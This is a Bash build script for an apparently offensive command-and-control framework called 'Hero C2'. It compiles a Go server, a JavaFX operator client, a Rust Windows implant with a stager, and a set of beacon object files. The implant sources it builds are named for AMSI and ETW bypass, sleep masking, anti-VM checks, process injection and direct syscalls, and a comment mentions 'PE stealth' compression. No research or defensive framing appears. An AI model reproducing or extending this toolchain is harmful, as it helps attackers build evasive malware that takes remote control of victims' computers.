#!/usr/bin/env bash
# build.sh — Hero C2: Go Server + JavaFX Client + Implant + BOFs
#
# Usage:
#   ./build.sh            → full build (server → client → implant → bofs)
#   ./build.sh server     → Go server only
#   ./build.sh client     → Java client only
#   ./build.sh implant    → Rust implant only
#   ./build.sh bofs       → compile BOF arsenal (bofs/bofs_src/*.c → bofs/bofs_out/*.x64.o)
#   ./build.sh clean      → remove build artifacts

set -euo pipefail

# ── Go proxy — bypass corporate/private proxies, download directly from source
export GOPROXY=direct

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; DIM='\033[2m'; BOLD='\033[1m'; NC='\033[0m'
OK="${GREEN}[OK]${NC}"; FAIL="${RED}[FAIL]${NC}"
WARN="${YELLOW}[WARN]${NC}"; INFO="${CYAN}[INFO]${NC}"

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT_DIR"

GO_SERVER_DIR="${ROOT_DIR}/server/go_server"
JAVA_CLIENT_DIR="${ROOT_DIR}/server/client/src"
IMPLANT_DIR="${ROOT_DIR}/implant/agent_core"
BIN_DIR="${ROOT_DIR}/bin"
mkdir -p "$BIN_DIR"

# ── CPU budget ────────────────────────────────────────────────
# Use half the available cores — compilation stays responsive,
# system doesn't freeze, no thermal throttle on laptop hardware.
TOTAL_CORES=$(nproc 2>/dev/null || echo 2)
HALF_CORES=$(( TOTAL_CORES > 1 ? TOTAL_CORES / 2 : 1 ))
MAX_C_JOBS=$HALF_CORES   # max parallel GCC processes
export CARGO_JOBS=$HALF_CORES
export CARGO_INCREMENTAL=1  # skip unchanged crates — big speedup on rebuilds

# ccache: if available, wrap GCC for C compilation
if command -v ccache &>/dev/null; then
    CC="ccache x86_64-w64-mingw32-gcc"
    CCACHE_HINT="(ccache enabled)"
else
    CC="x86_64-w64-mingw32-gcc"
    CCACHE_HINT="(ccache not found — install for faster rebuilds)"
fi

##################################################
# CLEAN
##################################################
if [ "${1:-}" = "clean" ]; then
    echo -e "${BOLD}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}║         H E R O  —  Clean Build Artifacts       ║${NC}"
    echo -e "${BOLD}╚══════════════════════════════════════════════════╝${NC}"
    echo ""

    REMOVED=0
    rm_file() { [ -f "$1" ] && rm -f "$1" && echo -e "${OK} Removed: $1" && REMOVED=$((REMOVED+1)) || true; }
    rm_dir()  { [ -d "$1" ] && rm -rf "$1" && echo -e "${OK} Removed: $1/" && REMOVED=$((REMOVED+1)) || true; }

    rm_file "${ROOT_DIR}/hero"
    rm_file "${BIN_DIR}/c2-server"
    rm_file "${BIN_DIR}/c2-client"
    rm_file "${BIN_DIR}/c2-client.jar"
    rm_file "${BIN_DIR}/hero_agent.exe"
    rm_dir  "${BIN_DIR}/lib"
    rm_dir  "${JAVA_CLIENT_DIR}/target"
    rm_dir  "${IMPLANT_DIR}/target"
    rm_dir  "${ROOT_DIR}/implant/bof"
    rm_dir  "${ROOT_DIR}/bofs/bofs_out"
    mkdir -p "${ROOT_DIR}/bofs/bofs_out"
    touch   "${ROOT_DIR}/bofs/bofs_out/.gitkeep"
    echo -e "${OK} Recreated empty: bofs/bofs_out/"
    rm_file "${ROOT_DIR}/.cargo_build.log"
    rm_dir  "${ROOT_DIR}/payloads"
    rm_dir  "${ROOT_DIR}/hero-data"
    rm_dir  "${ROOT_DIR}/tmp"

    # Also clear ccache for this project if operator wants full clean
    command -v ccache &>/dev/null && ccache -c -q 2>/dev/null && echo -e "${OK} ccache cleared" || true

    echo ""
    echo -e "${GREEN}Cleaned ${REMOVED} item(s)${NC}"
    exit 0
fi

##################################################
# BANNER
##################################################
echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║         H E R O  —  Build System v3.0            ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${DIM}Root    : ${ROOT_DIR}${NC}"
echo -e "${DIM}CPU     : ${TOTAL_CORES} cores total → using ${HALF_CORES} for compilation${NC}"
echo -e "${DIM}ccache  : ${CCACHE_HINT}${NC}"
echo ""

ERRS=0
BUILD_SERVER=false
BUILD_CLIENT=false
BUILD_IMPLANT=false
BUILD_BOFS=false

MODE="${1:-all}"
case "$MODE" in
    server)   BUILD_SERVER=true ;;
    client)   BUILD_CLIENT=true ;;
    implant)  BUILD_IMPLANT=true ;;
    bofs|bof) BUILD_BOFS=true ;;   # 'bof' alias — common typo, same thing
    all)      BUILD_SERVER=true; BUILD_CLIENT=true; BUILD_IMPLANT=true; BUILD_BOFS=true ;;
    *)
        echo -e "${FAIL} Unknown mode: $MODE"
        echo "Usage: $0 [server|client|implant|bofs|clean]"
        exit 1
        ;;
esac

##################################################
# [1] DEPENDENCY CHECK
##################################################
echo -e "${BOLD}[1/?] Dependencies${NC}"
echo "─────────────────────────────────────────────"

check_cmd() {
    if command -v "$1" &>/dev/null; then
        VER=$(command "$1" --version 2>/dev/null | head -1 | grep -oP '[\d.]+' | head -1 || echo "?")
        echo -e "${OK} $1 ${DIM}(${VER})${NC}"
    else
        echo -e "${FAIL} $1 — install: $2"
        ERRS=$((ERRS+1))
    fi
}

$BUILD_SERVER  && check_cmd go   "sudo apt install -y golang-go"
$BUILD_CLIENT  && check_cmd java "sudo apt install -y openjdk-21-jdk"
$BUILD_CLIENT  && check_cmd mvn  "sudo apt install -y maven"
if $BUILD_IMPLANT; then
    check_cmd rustc "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    check_cmd cargo "install rust first"
    check_cmd x86_64-w64-mingw32-gcc "sudo apt install -y mingw-w64"
    if rustup target list --installed 2>/dev/null | grep -q "x86_64-pc-windows-gnu"; then
        echo -e "${OK} rust target: x86_64-pc-windows-gnu"
    else
        echo -e "${FAIL} rust target missing — run: rustup target add x86_64-pc-windows-gnu"
        ERRS=$((ERRS+1))
    fi
    command -v ccache  &>/dev/null && echo -e "${OK} ccache ${DIM}(C speedup)${NC}" || echo -e "${DIM}  ccache: not found (optional — sudo apt install ccache)${NC}"
fi

if $BUILD_BOFS && ! $BUILD_IMPLANT; then
    check_cmd x86_64-w64-mingw32-gcc "sudo apt install -y mingw-w64"
fi

if [ $ERRS -gt 0 ]; then
    echo -e "\n${FAIL} ${ERRS} missing dependency(ies) — fix and re-run."
    exit 1
fi
echo ""

##################################################
# EARLY FILE VALIDATION
# Check all source files exist BEFORE compiling anything.
# Fail fast — don't waste time compiling half the project.
##################################################
if $BUILD_IMPLANT; then
    echo -e "${DIM}Validating source files...${NC}"
    SRC_ROOT="${IMPLANT_DIR}/src/core_agent"
    BOFS_SRC_DIR="${ROOT_DIR}/bofs/bofs_src"
    BOFS_LOADER="${ROOT_DIR}/bofs/loader/bof_loader.c"
    MISSING=0

    # Agent-internal C files (SRC_ROOT-relative)
    C_FILES=(
        "evasion/amsi.c"
        "evasion/etw.c"
        "evasion/sleepmask/phantom_impl.c"
        "evasion/sleepmask/phantom_eng.c"
        "evasion/anti_vm.c"
        "evasion/exec_gap.c"
        "evasion/env_maturity.c"
        "evasion/net_probe.c"
        "injection/inject.c"
        "syscall/syscall_stubs.c"
        "evasion/syscalls/hero_peb_walking.c"
        "evasion/syscalls/forge.c"
        "evasion/syscalls/exec.c"
        "evasion/syscalls/syscall_mask.c"
    )
    # phantom_asm.S checked separately (different compile flags)
    [ -f "${SRC_ROOT}/evasion/sleepmask/phantom_asm.S" ] || { echo -e "${WARN} Missing: evasion/sleepmask/phantom_asm.S"; MISSING=$((MISSING+1)); }

    for c_rel in "${C_FILES[@]}"; do
        [ -f "${SRC_ROOT}/${c_rel}" ] || { echo -e "${WARN} Missing: ${c_rel}"; MISSING=$((MISSING+1)); }
    done

    # BOF workspace files (ROOT-relative)
    [ -f "${BOFS_LOADER}" ] || { echo -e "${WARN} Missing: bofs/loader/bof_loader.c"; MISSING=$((MISSING+1)); }
    [ -f "${BOFS_SRC_DIR}/hidden_desktop.c" ] || { echo -e "${WARN} Missing: bofs/bofs_src/hidden_desktop.c"; MISSING=$((MISSING+1)); }
    [ -d "${ROOT_DIR}/bofs/include" ] || { echo -e "${WARN} Missing: bofs/include/ (beacon.h for arsenal)"; MISSING=$((MISSING+1)); }

    # Cargo binary targets — a MISSING src/bin/*.rs makes cargo fail with
    # "can't find bin hero_agent" AFTER minutes of C compilation. Catch it
    # here instead (herov5.zip shipped without src/bin/ — this guards it).
    for bin_rs in hero_agent.rs hero_stager.rs stager_config.rs; do
        [ -f "${IMPLANT_DIR}/src/bin/${bin_rs}" ] || {
            echo -e "${FAIL} Missing: implant/agent_core/src/bin/${bin_rs}"
            echo -e "       → src/bin/ folder incomplete — re-extract the full framework zip!"
            MISSING=$((MISSING+1))
        }
    done

    [ ! -f "${IMPLANT_DIR}/Cargo.toml" ] && echo -e "${FAIL} Missing: Cargo.toml" && MISSING=$((MISSING+1))

    if [ $MISSING -gt 0 ]; then
        echo -e "${WARN} ${MISSING} file(s) missing — C pre-compile will warn, Rust build may fail."
    else
        echo -e "${DIM}  All source files present.${NC}"
    fi
    echo ""
fi

STEP=2

##################################################
# [2] GO SERVER
##################################################
if $BUILD_SERVER; then
    echo -e "${BOLD}[$STEP/?] Go Server${NC}"
    echo "─────────────────────────────────────────────"

    [ ! -f "${GO_SERVER_DIR}/go.mod" ] && echo -e "${FAIL} go.mod not found" && exit 1
    cd "$GO_SERVER_DIR"

    # go mod tidy: only run if go.sum is missing or go.mod newer than go.sum
    # Avoids a slow network round-trip on every rebuild
    if [ ! -f "go.sum" ] || [ "go.mod" -nt "go.sum" ]; then
        echo -e "${INFO} go.sum stale — running go mod tidy..."
        go mod tidy 2>/dev/null
    else
        echo -e "${DIM}  go.sum up-to-date — skipping mod tidy${NC}"
    fi

    echo -e "${INFO} Compiling Go server ${DIM}(-p ${HALF_CORES})${NC}..."
    # -p: number of parallel package compilations
    # -trimpath: removes local paths from binary (smaller, reproducible)
    if go build \
        -p "${HALF_CORES}" \
        -trimpath \
        -o "${BIN_DIR}/c2-server" . 2>&1; then
        SZ=$(du -h "${BIN_DIR}/c2-server" | cut -f1)
        echo -e "${OK} bin/c2-server (${SZ})"
    else
        echo -e "${FAIL} Go server build failed"
        exit 1
    fi

    cd "$ROOT_DIR"
    echo ""
    STEP=$((STEP+1))
fi

##################################################
# [3] JAVA CLIENT
##################################################
if $BUILD_CLIENT; then
    echo -e "${BOLD}[$STEP/?] JavaFX Client${NC}"
    echo "─────────────────────────────────────────────"

    [ ! -f "${JAVA_CLIENT_DIR}/pom.xml" ] && echo -e "${FAIL} pom.xml not found" && exit 1
    cd "$JAVA_CLIENT_DIR"

    JAR="${JAVA_CLIENT_DIR}/target/c2-client-2.0.0.jar"

    # Incremental Maven: if JAR exists and no source is newer than it, skip compile
    NEED_MVN_BUILD=true
    if [ -f "$JAR" ]; then
        # Check if any .java source is newer than the existing JAR
        # NOTE: JAVA_CLIENT_DIR already IS the src dir (java files under ui/, service/, etc.)
        # -print -quit = stop at first match; || true guards against set -e + pipefail death
        NEWER=$(find "${JAVA_CLIENT_DIR}" -name "*.java" -newer "$JAR" -print -quit 2>/dev/null || true)
        if [ -z "$NEWER" ]; then
            echo -e "${DIM}  No source changes detected — skipping full Maven compile.${NC}"
            echo -e "${DIM}  (Run './build.sh clean' then rebuild to force full recompile)${NC}"
            NEED_MVN_BUILD=false
        fi
    fi

    if $NEED_MVN_BUILD; then
        echo -e "${INFO} Building JavaFX client with Maven ${DIM}(-T ${HALF_CORES})${NC}..."
        # -T: thread count (HALF_CORES threads, not all)
        # No 'clean' — Maven's incremental compile handles changed files
        # -q: quiet (errors still shown)
        # -DskipTests: no test execution
        if mvn package \
            -T "${HALF_CORES}" \
            -q \
            -DskipTests \
            -Dmaven.compile.fork=false \
            2>&1; then
            BUILD_OK=true
        else
            # If non-clean build fails, try with clean once
            echo -e "${WARN} Incremental build failed — retrying with clean..."
            if mvn clean package -T "${HALF_CORES}" -q -DskipTests 2>&1; then
                BUILD_OK=true
            else
                echo -e "${FAIL} Java client build failed"
                exit 1
            fi
        fi
    fi

    if [ -f "$JAR" ]; then
        SZ=$(du -h "$JAR" | cut -f1)
        echo -e "${OK} c2-client-2.0.0.jar (${SZ})"
        cp "$JAR" "${BIN_DIR}/c2-client.jar"
        cp -r "${JAVA_CLIENT_DIR}/target/lib" "${BIN_DIR}/lib" 2>/dev/null || true

        cat > "${BIN_DIR}/c2-client" << 'LAUNCHER'
#!/usr/bin/env bash
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
NATIVE_DIR="${SCRIPT_DIR}/lib/native"
if [ ! -d "$NATIVE_DIR" ]; then
    mkdir -p "$NATIVE_DIR"
    for jar in "${SCRIPT_DIR}"/lib/javafx-*.jar; do
        # -qq + full redirect: extract natives SILENTLY (no 'Archive:' spam on startup)
        [ -f "$jar" ] && unzip -o -j -qq "$jar" 'lib/*.so' 'lib/*.dll' -d "$NATIVE_DIR" >/dev/null 2>&1 || true
    done
fi
MOD_PATH=""
CP_PATH="${SCRIPT_DIR}/c2-client.jar"
for jar in "${SCRIPT_DIR}"/lib/*.jar; do
    [ -f "$jar" ] || continue
    case "$(basename "$jar")" in
        javafx-*) MOD_PATH="${MOD_PATH:+$MOD_PATH:}$jar" ;;
        *) CP_PATH="${CP_PATH:+$CP_PATH:}$jar" ;;
    esac
done
# CRITICAL: javafx.web MUST be in --add-modules. Without it the module never
# resolves, NGWebView loads from the classpath (unnamed module) while NGGroup
# lives in javafx.graphics -> IllegalAccessError: superclass access check
# failed -> SessionTab (terminal) and NetworkGraphWindow both crash on open.
exec java \
    -Djava.library.path="$NATIVE_DIR" \
    --module-path "$MOD_PATH" \
    --add-modules javafx.controls,javafx.fxml,javafx.graphics,javafx.web \
    -cp "$CP_PATH" \
    C2Client "$@"
LAUNCHER
        chmod +x "${BIN_DIR}/c2-client"
        echo -e "${OK} bin/c2-client launcher created"
    else
        echo -e "${WARN} JAR not found after build"
    fi

    cd "$ROOT_DIR"
    echo ""
    STEP=$((STEP+1))
fi

##################################################
# [4] IMPLANT — C pre-compile (parallel) + Rust
##################################################
if $BUILD_IMPLANT; then
    echo -e "${BOLD}[$STEP/?] Implant (Rust → Windows x64)${NC}"
    echo "─────────────────────────────────────────────"

    SRC_ROOT="${IMPLANT_DIR}/src/core_agent"
    BOFS_SRC_DIR="${ROOT_DIR}/bofs/bofs_src"
    # CFLAGS for pre-compile + build.rs (matches Cargo build.rs CFLAGS exactly):
    #   -Wno-misleading-indentation : suppression-only, no behavior change.
    #     The HERO syscall/PEB-walk C source uses dense single-line
    #     `if(...) a; b; if(...) c;` patterns intentionally (compact
    #     shellcode-friendly code). GCC 8+ emits -Wmisleading-indentation
    #     under -Wall for these — older GCCs printed it as a warning and
    #     returned 0; GCC 14 still returns 0, but build.sh's failure
    #     detection looks at the gcc exit status AND stderr content
    #     (any line starting with "warning:" trips the FAIL path even
    #     though gcc returned success). Suppress the warning at the
    #     compiler level so the dense style stays — code behavior is
    #     unchanged, only the diagnostic noise goes away.
    CFLAGS="-c -O2 -Wall -Wno-misleading-indentation -m64 -fno-exceptions -fno-unwind-tables \
            -fno-asynchronous-unwind-tables -fno-ident"

    # ── Parallel C pre-compile ────────────────────────────────
    # All C files launch as background jobs simultaneously.
    # A semaphore (counter) limits concurrent jobs to MAX_C_JOBS
    # so we don't flood the CPU. Each job writes result to a temp
    # file; main loop reads results after wait().
    echo -e "${INFO} Pre-compiling C files ${DIM}(parallel, max ${MAX_C_JOBS} jobs)${NC}..."

    # Agent-internal C files (SRC_ROOT-relative) — shadow7 phantom files same CFLAGS
    C_FILES=(
        "evasion/amsi.c"
        "evasion/etw.c"
        "evasion/sleepmask/phantom_impl.c"
        "evasion/sleepmask/phantom_eng.c"
        "evasion/anti_vm.c"
        "evasion/exec_gap.c"
        "evasion/env_maturity.c"
        "evasion/net_probe.c"
        "injection/inject.c"
        "syscall/syscall_stubs.c"
        "evasion/syscalls/hero_peb_walking.c"
        "evasion/syscalls/forge.c"
        "evasion/syscalls/exec.c"
        "evasion/syscalls/syscall_mask.c"
    )

    TMP_DIR=$(mktemp -d /tmp/hero_build_XXXXXX)
    trap "rm -rf '$TMP_DIR'" EXIT

    # Parallel job control via wait -n (bash 4.3+)
    # No associative arrays — avoids bash iteration bug that causes hang.
    # wait -n: blocks until ANY one background job finishes → slot opens up.
    RUNNING=0
    PIDS=()

    launch_slot() {
        # If at job limit: wait for one to finish, then continue
        if [ "$RUNNING" -ge "$MAX_C_JOBS" ]; then
            wait -n 2>/dev/null || wait "${PIDS[0]}" 2>/dev/null || true
            RUNNING=$((RUNNING - 1))
            # Prune finished pids from tracking array
            local live=()
            for p in "${PIDS[@]}"; do
                kill -0 "$p" 2>/dev/null && live+=("$p") || true
            done
            PIDS=("${live[@]+"${live[@]}"}")
        fi
    }

    C_OK=0
    C_FAIL=0
    RESULT_FILES=()

    # Launch each C file as background job
    for c_rel in "${C_FILES[@]}"; do
        src="${SRC_ROOT}/${c_rel}"
        result_file="${TMP_DIR}/$(echo "$c_rel" | tr '/' '_').result"
        RESULT_FILES+=("$result_file:$c_rel")

        if [ ! -f "$src" ]; then
            echo "MISSING" > "$result_file"
            continue
        fi

        launch_slot

        (
            out="${TMP_DIR}/$(basename "${c_rel%.c}").o"
            err_file="${TMP_DIR}/$(basename "${c_rel%.c}").err"
            if $CC $CFLAGS -o "$out" "$src" 2>"$err_file"; then
                echo "OK" > "$result_file"
            else
                { echo "FAIL"; cat "$err_file"; } > "$result_file"
            fi
        ) &
        PIDS+=($!)
        RUNNING=$((RUNNING + 1))
    done

    # phantom_asm.S — Shadow7 assembly trampoline (different flags: -x assembler-with-cpp)
    phantom_asm_src="${SRC_ROOT}/evasion/sleepmask/phantom_asm.S"
    phantom_asm_result="${TMP_DIR}/phantom_asm.result"
    RESULT_FILES+=("$phantom_asm_result:evasion/sleepmask/phantom_asm.S")
    if [ -f "$phantom_asm_src" ]; then
        launch_slot
        (
            err_file="${TMP_DIR}/phantom_asm.err"
            if $CC -c -x assembler-with-cpp -m64 -o "${TMP_DIR}/phantom_asm.o" "$phantom_asm_src" 2>"$err_file"; then
                echo "OK" > "$phantom_asm_result"
            else
                { echo "FAIL"; cat "$err_file"; } > "$phantom_asm_result"
            fi
        ) &
        PIDS+=($!)
        RUNNING=$((RUNNING + 1))
    else
        echo "MISSING" > "$phantom_asm_result"
    fi

    # BOF — different flags, same pool (source: bofs/bofs_src/hidden_desktop.c)
    bof_src="${BOFS_SRC_DIR}/hidden_desktop.c"
    bof_result="${TMP_DIR}/bof_hidden_desktop.result"
    RESULT_FILES+=("$bof_result:hidden_desktop.c (BOF)")

    if [ -f "$bof_src" ]; then
        launch_slot
        (
            err_file="${TMP_DIR}/bof.err"
            if $CC -DBOF $CFLAGS -o "${TMP_DIR}/hidden_desktop.o" "$bof_src" 2>"$err_file"; then
                echo "OK" > "$bof_result"
            else
                { echo "FAIL"; cat "$err_file"; } > "$bof_result"
            fi
        ) &
        PIDS+=($!)
        RUNNING=$((RUNNING + 1))
    else
        echo "MISSING" > "$bof_result"
    fi

    # Wait for ALL remaining background jobs — no hang, clean exit
    wait

    # Print results in original order (not arrival order — deterministic output)
    for entry in "${RESULT_FILES[@]}"; do
        result_file="${entry%%:*}"
        label="${entry##*:}"
        if [ ! -f "$result_file" ]; then
            echo -e "${WARN} ${label} — no result"
            C_FAIL=$((C_FAIL+1))
            continue
        fi
        status=$(head -1 "$result_file")
        case "$status" in
            OK)      echo -e "${OK} ${label}"; C_OK=$((C_OK+1)) ;;
            MISSING) echo -e "${WARN} ${label} — file not found"; C_FAIL=$((C_FAIL+1)) ;;
            FAIL)
                echo -e "${FAIL} ${label} — compile error:"
                tail -n +2 "$result_file" | head -8 | sed 's/^/    /'
                C_FAIL=$((C_FAIL+1))
                ;;
        esac
    done

    echo -e "${DIM}  C files: ${C_OK} OK, ${C_FAIL} failed${NC}"
    [ "$C_FAIL" -gt 0 ] && echo -e "${WARN} ${C_FAIL} C file(s) failed — agent GUI build may error." || true
    echo ""

    # ── Rust build ───────────────────────────────────────────
    # CARGO_JOBS     — already exported above (HALF_CORES)
    # CARGO_INCREMENTAL — already exported (1 = reuse prev artifacts)
    # codegen-units  — pin to HALF_CORES (parallel LLVM units, controlled)
    # opt-level=z    — size over speed (less LLVM work than opt-level=3)
    # crt-static     — statically link CRT (single portable .exe)

    CARGO_LOG="${ROOT_DIR}/.cargo_build.log"

    export RUSTFLAGS="-C target-feature=+crt-static \
                      -C codegen-units=${HALF_CORES} \
                      -C opt-level=z"

    echo -e "${INFO} Compiling Rust ${DIM}(CARGO_JOBS=${HALF_CORES}, incremental=ON)${NC}..."
    echo -e "${DIM}  Full log → .cargo_build.log${NC}"

    BUILD_START=$SECONDS

    if cargo build \
        --manifest-path "${IMPLANT_DIR}/Cargo.toml" \
        --target x86_64-pc-windows-gnu \
        --release \
        --features cffi \
        --bin hero_agent \
        --jobs "${HALF_CORES}" \
        > "$CARGO_LOG" 2>&1; then

        ELAPSED=$((SECONDS - BUILD_START))
        BUILT="${IMPLANT_DIR}/target/x86_64-pc-windows-gnu/release/hero_agent.exe"

        if [ -f "$BUILT" ]; then
            SZ=$(du -h "$BUILT" | cut -f1)
            SHA=$(sha256sum "$BUILT" | awk '{print $1}' | cut -c1-16)
            echo -e "${OK} hero_agent.exe (${SZ}) sha256:${SHA}... ${DIM}[${ELAPSED}s]${NC}"
            cp "$BUILT" "${BIN_DIR}/hero_agent.exe"

            # No UPX — custom compression handled by build_handler.go (PE stealth + custom compressor)
        else
            echo -e "${WARN} Cargo OK but .exe not found at expected path"
        fi

        # grep exits 1 when zero warnings — || true prevents set -e + pipefail death
        # (grep -c still prints the count, unlike `|| echo 0` which double-printed)
        WARNINGS=$(grep -cE "^warning\[" "$CARGO_LOG" 2>/dev/null || true)
        [ "$WARNINGS" -gt 0 ] && echo -e "${DIM}  ${WARNINGS} warning(s) — see .cargo_build.log${NC}" || true

    else
        echo -e "${FAIL} Rust build failed:"
        grep -E "^error" "$CARGO_LOG" 2>/dev/null | head -20 | sed 's/^/  /'
        echo -e "${DIM}Full log: .cargo_build.log${NC}"
        unset RUSTFLAGS
        exit 1
    fi

    unset RUSTFLAGS
    echo ""
    STEP=$((STEP+1))
fi

##################################################
# [5] BOF ARSENAL — bofs/bofs_src/*.c → bofs/bofs_out/*.x64.o
#     Standalone BOF workspace (implant se bilkul alag).
#     Loader (bofs/loader/bof_loader.c) agent ke andar link hota hai —
#     yahan sirf BOF binaries compile hote hain jo agent runtime pe
#     execute karta hai (server task se COFF milta hai).
##################################################
if $BUILD_BOFS; then
    echo -e "${BOLD}[$STEP/?] BOF Arsenal (mingw → COFF objects)${NC}"
    echo "─────────────────────────────────────────────"

    BOFS_SRC_DIR="${ROOT_DIR}/bofs/bofs_src"
    BOFS_OUT_DIR="${ROOT_DIR}/bofs/bofs_out"
    mkdir -p "$BOFS_OUT_DIR"

    # BOF compile flags — build.rs section-5 ke identical (COFF compat):
    #   -DBOF        : BOF code paths enable
    #   -c           : compile only, NO linking (COFF object file) —
    #                  NOTE: -nostdlib is a LINK-time flag, useless with -c,
    #                  and it breaks non-gnu drivers (zig cc). Dropped.
    #   (-I bofs/include is passed separately per-compile, see below —
    #    keeps the beacon.h include dir properly quoted with spaces)
    BOF_CFLAGS="-DBOF -c -O2 -Wall -m64 \
                -fno-exceptions -fno-unwind-tables \
                -fno-asynchronous-unwind-tables -fno-ident"

    # v2: NESTED DIRECTORY SUPPORT
    shopt -s nullglob
    BOF_SOURCES=()
    for f in "${BOFS_SRC_DIR}"/*.c; do
        BOF_SOURCES+=("$f")
    done
    for f in "${BOFS_SRC_DIR}"/*/*.c; do
        BOF_SOURCES+=("$f")
    done
    shopt -u nullglob

    if [ ${#BOF_SOURCES[@]} -eq 0 ]; then
        echo -e "${WARN} No BOF sources found in bofs/bofs_src/ — nothing to compile."
    fi

    BOF_OK=0
    BOF_FAIL=0
    for bof_c in "${BOF_SOURCES[@]}"; do
        rel_path="${bof_c#${BOFS_SRC_DIR}/}"
        name="${rel_path%.c}"
        bof_out="${BOFS_OUT_DIR}/${name}.x64.o"
        bof_out_dir="$(dirname "$bof_out")"
        mkdir -p "$bof_out_dir"
        echo -ne "  ${INFO} ${name}.c → bofs_out/${name}.x64.o ... "
        err_file=$(mktemp)
        if $CC $BOF_CFLAGS -I "${ROOT_DIR}/bofs/include" -o "$bof_out" "$bof_c" 2>"$err_file"; then
            SZ=$(du -h "$bof_out" | cut -f1)
            echo -e "${OK} (${SZ})"
            BOF_OK=$((BOF_OK+1))
        else
            echo -e "${FAIL}"
            head -6 "$err_file" | sed 's/^/      /'
            BOF_FAIL=$((BOF_FAIL+1))
        fi
        rm -f "$err_file"
    done

    echo ""
    echo -e "${DIM}  BOFs: ${BOF_OK} OK, ${BOF_FAIL} failed → bofs/bofs_out/${NC}"
    [ "$BOF_FAIL" -gt 0 ] && exit 1 || true
    echo ""
    STEP=$((STEP+1))
fi

##################################################
# VERIFY
##################################################
echo -e "${BOLD}[$STEP/$STEP] Verify${NC}"
echo "─────────────────────────────────────────────"

$BUILD_SERVER  && { [ -f "${BIN_DIR}/c2-server" ]     && echo -e "${OK} bin/c2-server"         || echo -e "${FAIL} bin/c2-server missing"; }
$BUILD_CLIENT  && { [ -f "${BIN_DIR}/c2-client" ]     && echo -e "${OK} bin/c2-client"         || echo -e "${FAIL} bin/c2-client missing"; }
$BUILD_CLIENT  && { [ -f "${BIN_DIR}/c2-client.jar" ] && echo -e "${OK} bin/c2-client.jar"     || echo -e "${WARN} bin/c2-client.jar missing"; }
$BUILD_CLIENT  && { [ -d "${BIN_DIR}/lib" ]           && echo -e "${OK} bin/lib/"              || echo -e "${WARN} bin/lib/ missing"; }
$BUILD_IMPLANT && { [ -f "${BIN_DIR}/hero_agent.exe" ] && echo -e "${OK} bin/hero_agent.exe"   || echo -e "${WARN} bin/hero_agent.exe (built on-demand)"; }
$BUILD_BOFS    && {
    BOF_COUNT=$(find "${ROOT_DIR}/bofs/bofs_out" -name "*.x64.o" 2>/dev/null | wc -l)
    if [ "$BOF_COUNT" -gt 0 ]; then
        echo -e "${OK} bofs/bofs_out/ (${BOF_COUNT} BOF object(s) — recursive)"
    else
        echo -e "${WARN} bofs/bofs_out/ empty"
    fi
}

echo ""
echo -e "${BOLD}Usage:${NC}"
$BUILD_SERVER  && echo -e "${DIM}  Server : ./bin/c2-server  (or: C2_PASSWORD=xxx ./bin/c2-server)${NC}"
$BUILD_CLIENT  && echo -e "${DIM}  Client : ./bin/c2-client${NC}"
$BUILD_IMPLANT && echo -e "${DIM}  Implant: see payloads/ directory${NC}"
$BUILD_BOFS    && echo -e "${DIM}  BOFs   : bofs/bofs_out/*.x64.o — task via: bof <name> [type:arg ...] (server packs+validates)${NC}"

echo ""
echo -e "${BOLD}[BUILD COMPLETE]${NC}"
echo ""